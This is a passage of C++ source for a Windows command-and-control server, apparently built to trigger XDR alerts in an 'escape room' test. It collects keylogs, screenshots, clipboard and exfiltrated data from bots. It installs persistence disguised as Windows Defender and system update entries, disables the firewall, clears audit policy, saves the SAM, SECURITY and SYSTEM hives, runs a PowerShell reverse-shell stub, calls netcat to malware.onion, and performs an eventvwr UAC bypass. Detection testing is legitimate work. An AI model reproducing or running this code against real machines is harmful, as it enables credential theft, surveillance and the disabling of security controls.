                            size_t endPos = clearTextData.find("\nSCREENSHOT:DATA:END");
                            
                            if (startPos != std::string::npos && endPos != std::string::npos) {
                                // Extract metadata
                                std::string resolution = "";
                                std::string timestamp = "";
                                std::string origFilename = "";
                                
                                size_t resPos = clearTextData.find("Resolution:");
                                if (resPos != std::string::npos) {
                                    resPos += 11;
                                    size_t resEnd = clearTextData.find("\n", resPos);
                                    if (resEnd != std::string::npos) {
                                        resolution = clearTextData.substr(resPos, resEnd - resPos);
                                    }
                                }
                                
                                size_t timePos = clearTextData.find("Timestamp:");
                                if (timePos != std::string::npos) {
                                    timePos += 10;
                                    size_t timeEnd = clearTextData.find("\n", timePos);
                                    if (timeEnd != std::string::npos) {
                                        timestamp = clearTextData.substr(timePos, timeEnd - timePos);
                                    }
                                }
                                
                                size_t filePos = clearTextData.find("Filename:");
                                if (filePos != std::string::npos) {
                                    filePos += 9;
                                    size_t fileEnd = clearTextData.find("\n", filePos);
                                    if (fileEnd != std::string::npos) {
                                        origFilename = clearTextData.substr(filePos, fileEnd - filePos);
                                    }
                                }
                                
                                // Get base64 data
                                std::string base64Data = clearTextData.substr(startPos, endPos - startPos);
                                
                                // Create screenshots directory
                                CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
                                
                                // Decode base64 to binary
                                std::vector<unsigned char> decodedData = base64Decode(base64Data);
                                
                                // Save screenshot using organized evidence system
                                std::string bmpData(reinterpret_cast<const char*>(decodedData.data()), decodedData.size());
                                std::string screenshotFile = saveEvidence(clientId, "screenshots", bmpData, ".bmp");
                                
                                if (!screenshotFile.empty()) {
                                    logActivity("COLLECTION", "SCREENSHOT_SIZE", 
                                               "File size: " + std::to_string(decodedData.size()) + " bytes");
                                    
                                    // Also save the base64 version for reference
                                    saveEvidence(clientId, "screenshots", base64Data, "_base64.txt");
                                    
                                    // Save metadata
                                    std::string metadata = "Client: " + clientId + "\n";
                                    metadata += "Hostname: " + client.hostname + "\n";
                                    metadata += "Username: " + client.username + "\n";
                                    metadata += "Timestamp: " + timestamp + "\n";
                                    metadata += "Resolution: " + resolution + "\n";
                                    metadata += "Original Path: " + origFilename + "\n";
                                    metadata += "Data File: " + screenshotFile + "\n";
                                    saveEvidence(clientId, "screenshots", metadata, "_meta.txt");
                                    
                                    logActivity("EVIDENCE", "SCREENSHOT_STORED", "Screenshot and metadata saved to evidence directory");
                                }
                            }
                        }
                        else if (clearTextData.find("SCREENSHOT:SAVED:") == 0) {
                            // Legacy format - just log it
                            std::string filename = clearTextData.substr(17);
                            logActivity("COLLECTION", "SCREENSHOT", "Screenshot saved on client: " + filename);
                        }
                        else {
                            // Try to extract any base64 data or file content
                            if (clearTextData.length() > 50) { // Likely contains actual data
                                std::string rawData = "=== SCREENSHOT DATA FROM " + clientId + " ===\n";
                                rawData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
                                rawData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
                                rawData += "=== RAW DATA ===\n";
                                rawData += clearTextData + "\n";
                                
                                std::string filename = saveEvidence(clientId, "screenshots", rawData, "_raw.txt");
                                if (!filename.empty()) {
                                    logActivity("COLLECTION", "SCREENSHOT_SAVED", "Screenshot data saved to: " + filename);
                                }
                            } else {
                                logActivity("DEBUG", "SCREENSHOT_UNHANDLED", "Short screenshot response: " + clearTextData);
                            }
                        }
                    }
                    else if (clearTextData.find("KEYLOG:") == 0 || clearTextData.find("KEYLOGGER:") == 0) {
                        // Handle keylogger data
                        logActivity("COLLECTION", "KEYLOG_RECEIVED", "Processing keylog data from " + clientId);
                        dataProcessed = true;
                        
                        // Create keylogs directory
                        CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                        
                        if (clearTextData.find("KEYLOG:DUMP:START") == 0 || clearTextData.find("KEYLOGGER:DATA:") == 0) {
                            // Create keylog directory
                            CreateDirectoryA("C:\\Windows\\Temp\\C2_Keylogs", NULL);
                            
                            // Extract keylog data
                            size_t startPos = clearTextData.find('\n') + 1;
                            size_t endPos = clearTextData.find("\nKEYLOG:DUMP:END");
                            
                            if (startPos != std::string::npos && endPos != std::string::npos) {
                                std::string keylogData = clearTextData.substr(startPos, endPos - startPos);
                                
                                // Log actual captured keystrokes
                                logActivity("COLLECTION", "KEYLOG_RECEIVED", "Real keystrokes captured from " + clientId);
                                
                                // Parse and log individual window captures
                                std::istringstream stream(keylogData);
                                std::string line;
                                while (std::getline(stream, line)) {
                                    if (line.find("[") == 0 && line.find("Window:") != std::string::npos) {
                                        // This is a window title line
                                        logActivity("KEYLOG", "WINDOW_FOCUS", line);
                                    }
                                }
                                
                                // Save keylog data using organized evidence system
                                std::string keylogContent = "=== REAL KEYLOGGER CAPTURE ===\n";
                                keylogContent += "Client: " + clientId + "\n";
                                keylogContent += "Hostname: " + client.hostname + "\n";
                                keylogContent += "Username: " + client.username + "\n";
                                keylogContent += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
                                keylogContent += "=== ACTUAL CAPTURED KEYSTROKES ===\n";
                                keylogContent += keylogData + "\n";
                                
                                std::string keylogFile = saveEvidence(clientId, "keylogs", keylogContent, ".txt");
                                if (!keylogFile.empty()) {
                                    logActivity("EVIDENCE", "KEYLOG_STORED", "Real keylog saved to " + keylogFile);
                                    
                                    // Also save just the raw keystrokes for analysis
                                    saveEvidence(clientId, "keylogs", keylogData, "_raw.txt");
                                }
                            }
                        }
                        else if (clearTextData.find("KEYLOGGER:STARTED") == 0) {
                            logActivity("KEYLOG", "STARTED", "Keylogger successfully started on " + clientId);
                        }
                        else {
                            // Save any keylog data regardless of format
                            if (clearTextData.length() > 30) { // Likely contains keylog data
                                std::string rawKeylogData = "=== KEYLOG DATA FROM " + clientId + " ===\n";
                                rawKeylogData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
                                rawKeylogData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
                                rawKeylogData += "=== CAPTURED KEYSTROKES ===\n";
                                rawKeylogData += clearTextData + "\n";
                                
                                std::string filename = saveEvidence(clientId, "keylogs", rawKeylogData, "_unknown.txt");
                                if (!filename.empty()) {
                                    logActivity("COLLECTION", "KEYLOG_SAVED", "Keylog data saved to: " + filename);
                                }
                            }
                        }
                    }
                    else if (clearTextData.find("EXFIL:") == 0) {
                        // Handle exfiltrated data using organized evidence system
                        dataProcessed = true;
                        if (clearTextData.find("EXFIL:HTTP:DATA:") == 0) {
                            std::string exfilData = clearTextData.substr(16);
                            std::string exfilFile = saveEvidence(clientId, "exfiltration", exfilData, ".b64");
                            if (!exfilFile.empty()) {
                                logActivity("EVIDENCE", "DATA_STORED", "Exfiltrated data saved to " + exfilFile);
                            }
                        }
                    }
                    else if (clearTextData.find("CLIPBOARD:") == 0) {
                        // Handle clipboard data using organized evidence system
                        dataProcessed = true;
                        std::string clipboardContent = "Client: " + clientId + "\n";
                        clipboardContent += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
                        clipboardContent += "=== CLIPBOARD CONTENT ===\n";
                        clipboardContent += clearTextData + "\n";
                        
                        std::string clipFile = saveEvidence(clientId, "clipboard", clipboardContent, ".txt");
                        if (!clipFile.empty()) {
                            logActivity("EVIDENCE", "CLIPBOARD_STORED", "Clipboard data saved to " + clipFile);
                        }
                    }

                    // Catch-all handler for any unrecognized data
                    if (!dataProcessed && clearTextData.length() > 20) {
                        logActivity("DEBUG", "UNRECOGNIZED_DATA", "Saving unrecognized data from " + clientId + " - Length: " + std::to_string(clearTextData.length()));
                        
                        // Save unknown data using organized evidence system
                        std::string unknownData = "=== UNKNOWN DATA FROM " + clientId + " ===\n";
                        unknownData += "Timestamp: " + std::to_string(std::time(nullptr)) + "\n";
                        unknownData += "Data Length: " + std::to_string(clearTextData.length()) + "\n";
                        unknownData += "First 200 chars: " + clearTextData.substr(0, 200) + "\n";
                        unknownData += "=== FULL DATA ===\n";
                        unknownData += clearTextData + "\n";
                        
                        std::string filename = saveEvidence(clientId, "unknown", unknownData, ".txt");
                        if (!filename.empty()) {
                            logActivity("EVIDENCE", "UNKNOWN_DATA_SAVED", "Unknown data saved to: " + filename);
                        }
                    }
                    
                    // Store collected data
                    {
                        std::lock_guard<std::mutex> lock(clientsMutex);
                        connectedClients[clientId].collectedData["last_response"] = clearTextData;
                    }
                }
                
                // Handle connection close
                if (connectionClosed) {
                    logActivity("C2", "DISCONNECT", "Bot disconnected: " + clientId);
                    client.isActive = false;
                }
            }

            // Beacon interval with jitter
            std::uniform_int_distribution<> dis(BEACON_INTERVAL - 2, BEACON_INTERVAL + 5);
            std::this_thread::sleep_for(std::chrono::seconds(dis(gen)));
        }

        // Cleanup
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId].isActive = false;
        }

        closesocket(clientSocket);
        logActivity("C2", "CLEANUP", "Removed bot: " + clientId);
        
        // Update status file when client disconnects
        writeC2StatusToFile();
    }

    // Advanced dashboard with attack metrics
    void dashboardThread() {
        bool firstRun = true;
        auto lastFullRefresh = std::chrono::steady_clock::now();
        
        while (serverRunning) {
            std::this_thread::sleep_for(std::chrono::seconds(10)); // Increased to 10 seconds
            
            auto now = std::chrono::steady_clock::now();
            auto timeSinceRefresh = std::chrono::duration_cast<std::chrono::seconds>(now - lastFullRefresh).count();
            
            // Full screen clear only every 120 seconds or on first run
            if (firstRun || timeSinceRefresh >= 120) {
                system("cls");
                firstRun = false;
                lastFullRefresh = now;
                std::cout << "\033[33m[!] Keyboard shortcuts active - Press 'H' for help\033[0m\n" << std::endl;
            } else {
                // Just add new status lines instead of clearing
                std::cout << "\n" << std::string(80, '=') << std::endl;
            }

            // Header
            std::cout << "\033[31m"; // Red color
            std::cout << "\n+==============================================================+\n";
            std::cout << "|         C2 COMMAND & CONTROL DASHBOARD - ESCAPE ROOM         |\n";
            std::cout << "+==============================================================+\n";
            std::cout << "\033[0m"; // Reset color

            std::lock_guard<std::mutex> lock(clientsMutex);

            int activeCount = 0;
            int elevatedCount = 0;
            int totalBeacons = 0;

            for (const auto& [id, client] : connectedClients) {
                if (client.isActive) {
                    activeCount++;
                    if (client.isElevated) elevatedCount++;
                    totalBeacons += client.beaconCount;
                }
            }

            // Stats section with command tracking and threading info
            std::cout << "\033[32m"; // Green color
            std::cout << "| Active Bots: " << std::setw(8) << activeCount
                << "  |  Elevated: " << std::setw(8) << elevatedCount
                << "  |  Beacons: " << std::setw(8) << totalBeacons << " |\n";
            std::cout << "| Server Jobs: " << std::setw(8) << getActiveServerJobCount()
                << "  |  Queued: " << std::setw(10) << getQueuedServerJobCount()
                << "  |  Workers: " << std::setw(8) << NUM_SERVER_WORKER_THREADS << " |\n";
            std::cout << "| Commands Sent: " << std::setw(6) << totalCommandsSent
                << "  |  Server Uptime: " << std::setw(10) << (std::time(nullptr) - std::stoll(serverStartTime)) / 60 << " min |\n";
                
            // Real-time status logging with enhanced visibility
            auto currentTime = std::chrono::system_clock::now();
            auto currentTime_t = std::chrono::system_clock::to_time_t(currentTime);
            struct tm timeinfo;
            localtime_s(&timeinfo, &currentTime_t);
            char timeStr[100];
            strftime(timeStr, sizeof(timeStr), "%H:%M:%S", &timeinfo);
            
            std::cout << "| \033[33m[" << timeStr << "] SERVER STATUS: \033[32mONLINE \033[37m| Recent Activity: " 
                      << (activityLog.empty() ? "None" : std::to_string(activityLog.size()) + " entries") << " |\n";
                      
            // Log this status update to file
            logActivity("SERVER_STATUS", "DASHBOARD_UPDATE", "Active: " + std::to_string(activeCount) + 
                       " | Elevated: " + std::to_string(elevatedCount) + 
                       " | Commands: " + std::to_string(totalCommandsSent));
                       
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "|                        CONNECTED BOTS                        |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color
            
            // Real-time command status display
            std::cout << "\033[36m"; // Cyan color
            std::cout << "+---------------------- COMMAND STATUS -----------------------+\n";
            
            // Show recent commands from log files
            std::ifstream statusFile("C:\\temp\\c2_server_status.txt");
            if (statusFile.is_open()) {
                std::vector<std::string> recentLines;
                std::string line;
                while (std::getline(statusFile, line)) {
                    recentLines.push_back(line);
                }
                statusFile.close();
                
                // Show last 5 command status entries
                size_t startIdx = recentLines.size() > 5 ? recentLines.size() - 5 : 0;
                for (size_t i = startIdx; i < recentLines.size(); i++) {
                    std::string entry = recentLines[i];
                    if (entry.length() > 60) {
                        entry = entry.substr(0, 57) + "...";
                    }
                    std::cout << "| " << std::left << std::setw(60) << entry << " |\n";
                }
            } else {
                std::cout << "| \033[33mNo command status file found - commands may not be working\033[36m |\n";
                std::cout << "| \033[33mExpected: C:\\temp\\c2_server_status.txt\033[36m" << std::string(26, ' ') << "|\n";
            }
            
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color

            // Connected clients
            for (const auto& [id, client] : connectedClients) {
                if (client.isActive) {
                    auto clientTime = std::chrono::system_clock::now();
                    auto uptime = std::chrono::duration_cast<std::chrono::minutes>(clientTime - client.firstSeen).count();
                    auto lastSeen = std::chrono::duration_cast<std::chrono::seconds>(clientTime - client.lastSeen).count();

                    std::cout << "| " << std::left << std::setw(15) << client.hostname
                        << " | " << std::setw(15) << client.ipAddress
                        << " | " << std::setw(12) << client.username
                        << " | Up: " << std::setw(3) << uptime << "m"
                        << " | LS: " << std::setw(3) << lastSeen << "s |\n";
                }
            }

            // Attack indicators and test status
            std::cout << "\033[33m"; // Yellow color
            std::cout << "+==============================================================+\n";
            std::cout << "|                     ATTACK INDICATORS                        |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "| [ACTIVE] Credential Harvesting    | [ACTIVE] Lateral Movement|\n";
            std::cout << "| [ACTIVE] Data Exfiltration       | [ACTIVE] Persistence      |\n";
            std::cout << "| [ACTIVE] Process Injection       | [READY]  Ransomware       |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            
            // Show test execution status for each client
            if (!clientTestStatus.empty()) {
                std::cout << "|                    TEST EXECUTION STATUS                     |\n";
                std::cout << "+--------------------------------------------------------------+\n";
                for (const auto& [id, status] : clientTestStatus) {
                    if (connectedClients.find(id) != connectedClients.end() && connectedClients[id].isActive) {
                        std::string host = connectedClients[id].hostname;
                        if (host.length() > 12) host = host.substr(0, 12);
                        
                        int completedPhases = 0;
                        if (status.initialCompromiseComplete) completedPhases++;
                        if (status.footholdComplete) completedPhases++;
                        if (status.privEscComplete) completedPhases++;
                        if (status.defenseEvasionComplete) completedPhases++;
                        if (status.surveillanceComplete) completedPhases++;
                        if (status.discoveryComplete) completedPhases++;
                        if (status.lateralMovementComplete) completedPhases++;
                        if (status.collectionComplete) completedPhases++;
                        if (status.exfiltrationComplete) completedPhases++;
                        if (status.impactComplete) completedPhases++;
                        
                        std::cout << "| " << std::left << std::setw(12) << host 
                                  << " | Progress: " << std::setw(2) << completedPhases << "/10 phases"
                                  << " | Status: " << std::setw(20) 
                                  << (completedPhases == 10 ? "COMPLETE" : "TESTING IN PROGRESS") << " |\n";
                    }
                }
            }
            
            std::cout << "+==============================================================+\n";
            std::cout << "\033[0m"; // Reset color

            // Control legend - ALWAYS VISIBLE
            std::cout << "\033[36m"; // Cyan color
            std::cout << "\n+----------------------- CONTROL LEGEND -----------------------+\n";
            std::cout << "| MANUAL MODE ACTIVE - Press H for full help menu             |\n";
            std::cout << "| [ESC] Exit  | [1-5] Attack Phases  | [R] Ransomware         |\n";
            std::cout << "| [E] Exfil   | [P] Persistence      | [C] Clear All Logs         |\n";
            std::cout << "| [S] Screenshot | [K] Keylogger     | [D] Dump Keylogs       |\n";
            std::cout << "| [N] Network Tunnels | [T] TOR | [F12] Remote Desktop       |\n";
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color

            // Recent activity log with command status
            std::cout << "\033[35m"; // Magenta color
            std::cout << "\n+----------------------- RECENT ACTIVITY ----------------------+\n";
            
            // Show summary of command types sent in last 5 minutes
            auto fiveMinutesAgo = std::chrono::system_clock::now() - std::chrono::minutes(5);
            int recentCommands = 0;
            for (const auto& entry : activityLog) {
                if (entry.find("CMD_SENT") != std::string::npos) {
                    recentCommands++;
                }
            }
            
            std::cout << "| \033[33mCOMMAND STATUS: \033[37m" << recentCommands << " commands sent recently"
                      << " | Total Session: " << totalCommandsSent << " commands |\n";
            std::cout << "| \033[36mFILE LOGGING: \033[37mC:\\temp\\c2_server_status.txt (persistent)" << std::string(17, ' ') << "|\n";
            
            int logCount = 0;
            for (auto it = activityLog.rbegin(); it != activityLog.rend() && logCount < 6; ++it, ++logCount) {
                // Truncate long log entries to fit
                std::string logEntry = *it;
                if (logEntry.length() > 60) {
                    logEntry = logEntry.substr(0, 57) + "...";
                }
                std::cout << "| " << std::left << std::setw(60) << logEntry << " |\n";
            }
            // Fill empty log lines
            for (; logCount < 8; ++logCount) {
                std::cout << "| " << std::left << std::setw(60) << " " << " |\n";
            }
            std::cout << "+--------------------------------------------------------------+\n";
            std::cout << "\033[0m"; // Reset color
            
            // Status line
            auto statusTime = std::chrono::system_clock::now();
            auto statusTime_t = std::chrono::system_clock::to_time_t(statusTime);
            struct tm statusTimeInfo;
            localtime_s(&statusTimeInfo, &statusTime_t);
            char statusTimeStr[100];
            strftime(statusTimeStr, sizeof(statusTimeStr), "%Y-%m-%d %H:%M:%S", &statusTimeInfo);
            std::cout << "\n[" << statusTimeStr << "] Server running. Total commands sent: " << totalCommandsSent << "\n";
        }
    }

    // DNS tunneling listener (runs on separate thread)
    void dnsListener() {
        SOCKET dnsSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (dnsSocket == INVALID_SOCKET) return;

        sockaddr_in dnsAddr;
        dnsAddr.sin_family = AF_INET;
        dnsAddr.sin_addr.s_addr = INADDR_ANY;
        dnsAddr.sin_port = htons(DNS_PORT);

        if (bind(dnsSocket, (sockaddr*)&dnsAddr, sizeof(dnsAddr)) == 0) {
            logActivity("C2", "DNS_TUNNEL", "DNS tunneling listener started on port " + std::to_string(DNS_PORT));

            char buffer[512];
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);

            while (serverRunning) {
                int bytes = recvfrom(dnsSocket, buffer, sizeof(buffer), 0, (sockaddr*)&clientAddr, &clientAddrLen);
                if (bytes > 0) {
                    char clientIP[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
                    logActivity("EXFIL", "DNS_TUNNEL", "DNS exfiltration from " + std::string(clientIP));
                }
            }
        }

        closesocket(dnsSocket);
    }

    // Advanced persistence installer
    void installPersistenceMechanisms() {
        logActivity("ATTACK", "PERSISTENCE", "Installing multiple persistence mechanisms");

        // Registry Run key
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::string malwarePath = "C:\\Windows\\System32\\svchost.exe -k netsvcs";
            RegSetValueExA(hKey, "WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)malwarePath.c_str(), malwarePath.length() + 1);
            RegCloseKey(hKey);
            logActivity("ATTACK", "REG_PERSIST", "Registry persistence installed: HKCU\\Run\\WindowsDefenderUpdate");
        }

        // Scheduled task
        std::string taskXml = R"(<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\\Windows\\System32\\cmd.exe</Command>
      <Arguments>/c start /min C:\\temp\\updater.exe</Arguments>
    </Exec>
  </Actions>
</Task>)";

        std::ofstream taskFile("C:\\temp\\task.xml");
        if (taskFile.is_open()) {
            taskFile << taskXml;
            taskFile.close();
            system("schtasks /create /tn \"System Update Service\" /xml C:\\temp\\task.xml /f > nul 2>&1");
            logActivity("ATTACK", "SCHTASK_PERSIST", "Scheduled task persistence created");
        }

        // WMI Event Subscription
        logActivity("ATTACK", "WMI_PERSIST", "Creating WMI event subscription for persistence");

        // Service creation
        SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (hSCManager) {
            SC_HANDLE hService = CreateServiceA(
                hSCManager,
                "WindowsSystemUpdate",
                "Windows System Update Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                NULL, NULL, NULL, NULL, NULL
            );

            if (hService) {
                logActivity("ATTACK", "SERVICE_PERSIST", "Service persistence installed: WindowsSystemUpdate");
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }

        // Startup folder
        char startupPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath) == S_OK) {
            std::string lnkPath = std::string(startupPath) + "\\SystemUpdate.lnk";
            logActivity("ATTACK", "STARTUP_PERSIST", "Startup folder persistence: " + lnkPath);
        }
    }

    // Forward declarations
    void handleHTTPClient(SOCKET clientSocket);
    void executeQueuedCommand(const std::string& targetClientId, const std::string& command);
    void executeGlobalQueuedCommand(const std::string& command);
    void executeCommandInThread(SOCKET clientSocket, const std::string& clientId, const std::string& command);
    void logClientActivity(const std::string& category, const std::string& type, const std::string& message);
    void executeXDRDetectionFunctions(std::ofstream& evidence, const std::string& clientId);
    
    // XDR Detection Functions Implementation (Alerts 2-15)
    void executeXDRDetectionFunctions(std::ofstream& evidence, const std::string& clientId) {
        // 2. Windows Firewall disabled via Registry
        std::cout << "\n[2/15] Disabling Windows Firewall via Registry..." << std::endl;
        logClientActivity("XDR_ALERT_2", "FIREWALL_DISABLE", "Windows Firewall disabled via Registry");
        {
            // Disable firewall through registry (will fail without admin, but triggers detection)
            HKEY hKey;
            DWORD dwValue = 0;
            
            // Try to disable Domain Profile firewall
            if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, 
                "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                RegSetValueExA(hKey, "DoNotAllowExceptions", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                RegCloseKey(hKey);
            }
            
            // Try to disable Standard Profile firewall
            if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "EnableFirewall", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(dwValue));
                RegCloseKey(hKey);
            }
            
            if (evidence.is_open()) {
                evidence << "2. Firewall disabled via Registry\n";
            }
        }
        
        // 3. Clear event logging policy using auditpol.exe
        std::cout << "\n[3/15] Clearing audit policies with auditpol.exe..." << std::endl;
        logClientActivity("XDR_ALERT_3", "AUDITPOL_CLEAR", "Clear event logging with auditpol.exe");
        {
            system("auditpol.exe /clear /y");
            
            if (evidence.is_open()) {
                evidence << "3. Cleared audit policies with auditpol.exe\n";
            }
        }
        
        // 4. Enumeration of Windows services from public IP addresses
        std::cout << "\n[4/15] Service enumeration from public IPs..." << std::endl;
        logClientActivity("XDR_ALERT_4", "SERVICE_ENUM", "Windows service enumeration from public IPs");
        {
            // Simulate connections from public IP to service ports
            std::vector<int> servicePorts = {445, 139, 135, 138, 137};
            for (int port : servicePorts) {
                SOCKET enumSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (enumSocket != INVALID_SOCKET) {
                    sockaddr_in serviceAddr;
                    serviceAddr.sin_family = AF_INET;
                    serviceAddr.sin_port = htons(port);
                    serviceAddr.sin_addr.s_addr = inet_addr("8.8.8.8"); // Public IP
                    
                    u_long mode = 1;
                    ioctlsocket(enumSocket, FIONBIO, &mode);
                    connect(enumSocket, (sockaddr*)&serviceAddr, sizeof(serviceAddr));
                    
                    closesocket(enumSocket);
                }
            }
            
            if (evidence.is_open()) {
                evidence << "4. Service enumeration from public IP (8.8.8.8) to ports 445,139,135\n";
            }
        }
        
        // 5. Rundll32 spawning suspicious processes
        std::cout << "\n[5/15] Rundll32 spawning suspicious processes..." << std::endl;
        logClientActivity("XDR_ALERT_5", "RUNDLL32_SPAWN", "Rundll32 spawning cmd.exe");
        {
            // Create a simple DLL that spawns cmd.exe
            std::string dllPath = "C:\\Windows\\Temp\\test_" + generateSessionId() + ".dll";
            std::ofstream dllScript(dllPath + ".bat");
            if (dllScript.is_open()) {
                dllScript << "@echo off\n";
                dllScript << "start /min cmd.exe /c echo XDR Test 5 > nul\n";
                dllScript.close();
            }
            
            // Use rundll32 to execute (will fail but triggers detection)
            system(("rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c \"" + dllPath + ".bat\"").c_str());
            
            if (evidence.is_open()) {
                evidence << "5. Rundll32 spawned cmd.exe\n";
            }
        }
        
        // 6. Document discovery with find command
        std::cout << "\n[6/15] Document discovery with find command..." << std::endl;
        logClientActivity("XDR_ALERT_6", "DOC_DISCOVERY", "Find command searching for documents");
        {
            system("find /i \"password\" *.pdf* *.doc* *.xls* *.ppt* 2>nul");
            
            if (evidence.is_open()) {
                evidence << "6. Document discovery: find command for *.pdf* *.doc* *.xls*\n";
            }
        }
        
        // 7. Registry SAM/SECURITY/SYSTEM save
        std::cout << "\n[7/15] Saving SAM/SECURITY/SYSTEM registry hives..." << std::endl;
        logClientActivity("XDR_ALERT_7", "REG_SAVE", "Registry hive extraction");
        {
            // Attempt to save registry hives (requires admin)
            system("reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y 2>nul");
            system("reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive /y 2>nul");
            system("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y 2>nul");
            
            if (evidence.is_open()) {
                evidence << "7. Registry hive save attempted: SAM, SECURITY, SYSTEM\n";
            }
        }
        
        // 8. PowerShell reverse shell on port 4444
        std::cout << "\n[8/15] PowerShell reverse shell on port 4444..." << std::endl;
        logClientActivity("XDR_ALERT_8", "PS_REVERSE_SHELL", "PowerShell reverse shell to port 4444");
        {
            // Create PowerShell reverse shell connection to port 4444
            std::string psRevShell = "powershell.exe -NoP -NonI -W Hidden -C \"try{$c=New-Object Net.Sockets.TcpClient('127.0.0.1',4444);$s=$c.GetStream()}catch{}\"";
            
            // Also create the actual connection
            SOCKET revShell = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (revShell != INVALID_SOCKET) {
                sockaddr_in revAddr;
                revAddr.sin_family = AF_INET;
                revAddr.sin_port = htons(4444);
                revAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
                
                u_long mode = 1;
                ioctlsocket(revShell, FIONBIO, &mode);
                connect(revShell, (sockaddr*)&revAddr, sizeof(revAddr));
                
                closesocket(revShell);
            }
            
            system(psRevShell.c_str());
            
            if (evidence.is_open()) {
                evidence << "8. PowerShell reverse shell to port 4444\n";
            }
        }
        
        // 9. Rundll32 with ordinal numbers
        std::cout << "\n[9/15] Rundll32 with ordinal number arguments..." << std::endl;
        logClientActivity("XDR_ALERT_9", "RUNDLL32_ORDINAL", "Rundll32 using ordinal numbers");
        {
            // Execute rundll32 with ordinal number pattern
            system("rundll32.exe shell32.dll,#61 calc.exe");
            
            if (evidence.is_open()) {
                evidence << "9. Rundll32 with ordinal: shell32.dll,#61\n";
            }
        }
        
        // 10. Socat/Netcat connects to TOR domain
        std::cout << "\n[10/15] Netcat/Socat connecting to TOR domains..." << std::endl;
        logClientActivity("XDR_ALERT_10", "NC_TOR", "Netcat to TOR .onion domain");
        {
            // Download nc.exe if not present
            std::string ncPath = "C:\\Windows\\System32\\nc.exe";
            if (GetFileAttributesA(ncPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                // Simulate nc.exe download
                std::ofstream ncFile(ncPath);
                if (ncFile.is_open()) {
                    ncFile << "NC_STUB";
                    ncFile.close();
                }
            }
            
            // Attempt connection to .onion (will fail but triggers detection)
            system("nc.exe malware.onion 80 2>nul");
            
            if (evidence.is_open()) {
                evidence << "10. Netcat connection to malware.onion\n";
            }
        }
        
        // 11. UAC bypass via Event Viewer
        std::cout << "\n[11/15] UAC bypass via Event Viewer..." << std::endl;
        logClientActivity("XDR_ALERT_11", "UAC_BYPASS", "UAC bypass using eventvwr.exe");
        {
            // Set registry for UAC bypass
            HKEY hKey;
            std::string payload = "C:\\Windows\\System32\\cmd.exe";
            
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                "Software\\Classes\\mscfile\\shell\\open\\command",
                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)payload.c_str(), payload.length() + 1);
                RegCloseKey(hKey);
            }
            
            // Launch eventvwr.exe (which should spawn cmd.exe instead of mmc.exe)
            system("eventvwr.exe");
            
            // Clean up
            RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command");
            
            if (evidence.is_open()) {
                evidence << "11. UAC bypass via Event Viewer attempted\n";
            }
        }
        
        // 12. Multiple RDP sessions enabled via Registry
